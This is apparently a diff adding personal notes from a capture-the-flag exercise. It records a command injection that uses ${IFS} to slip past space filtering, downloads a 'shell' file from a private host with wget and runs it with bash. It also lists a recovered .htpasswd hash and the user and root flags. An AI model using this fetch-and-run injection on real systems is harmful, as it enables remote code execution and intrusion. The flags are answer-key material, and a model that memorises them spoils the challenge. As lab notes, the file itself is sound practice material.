@@ -1,0 +1,19 @@
+------Command injection------
+
+
+`wget${IFS}10.9.9.96:8000/shell`
+
+`bash${IFS}shell`
+
+
+---.htpasswd(user1 itsmeadmin)----
+
+itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
+
+---userflag---
+
+flag{0d8486a0c0c42503bb60ac77f4046ed7}
+
+---root flag----
+
+flag{d9b368018e912b541a4eb68399c5e94a}
